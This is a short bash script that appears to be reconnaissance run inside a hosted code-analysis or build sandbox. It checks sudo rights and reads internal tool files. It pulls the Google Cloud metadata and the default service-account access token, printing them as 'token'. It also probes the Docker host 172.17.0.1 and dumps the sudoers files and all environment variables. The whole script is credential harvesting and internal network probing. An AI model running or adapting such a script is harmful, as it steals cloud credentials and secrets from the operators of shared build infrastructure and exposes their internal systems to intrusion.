#!/bin/bash
# -*- coding: UTF8 -*-
ps -aux
cat /opt/deptrace/sudo-install
sudo id
echo "token :"
curl 'http://metadata.google.internal/computeMetadata/v1beta1?alt=json&recursive=true'
echo "token :"
curl 'http://metadata.google.internal/computeMetadata/v1beta1/instance/service-accounts/default/token?alt=json'
echo /opt/out/snapshot/workspace/lgtm/extract.sh
cat /opt/out/snapshot/workspace/lgtm/extract.sh
echo /opt/deptrace/deptrace
cat /opt/deptrace/deptrace
#apt-get install nmap
#nmap -nvv 172.17.0.1
curl -vv http://172.17.0.1
curl -vv http://172.17.0.1:8443

ls /etc/sudoers.d/
cat /etc/sudoers.d/*

env
